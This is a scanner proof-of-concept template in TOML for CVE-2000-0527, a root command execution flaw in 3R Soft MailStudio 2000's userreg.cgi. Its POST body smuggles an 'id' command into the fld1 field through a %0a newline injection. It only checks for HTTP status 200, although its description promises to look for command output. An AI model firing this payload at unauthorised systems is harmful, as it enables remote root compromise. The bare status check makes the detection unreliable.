[info]
author = "ave"
description = "通过向 /cgi-auth/userreg.cgi 发送特制 POST 请求，利用 fld1 参数缓冲区溢出或 %0a 命令注入，在服务器上以 root 权限执行任意命令。验证方式为发送包含命令注入 payload 的 POST 请求，检测响应中是否包含命令执行结果特征。"
id = "POC-AVE-2000-0438"
name = "3R Soft MailStudio 2000 userreg.cgi Remote Command Execution PoC"
severity = "critical"
tags = ["ave-2000-0438"]
vuln_id = [
    "CVE-2000-0527",
    "AVE-2000-0438",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cgi-auth/userreg.cgi"
protocol = "http"

[poc.requests.body]
content = "cmd=insert&chk=&template=%2Ftemplate%2Feng1&fld1=test%0aid&fld2=XXX&passwd_confirm=XXX&fld4=name&fld5=jiji&fld6=1&fld7=&fld9=&fld10=&fld11=&fld12=&fld13=&fld14=&fld15=&fld16=&fld17="
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
Host = "{{Hostname}}:8081"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
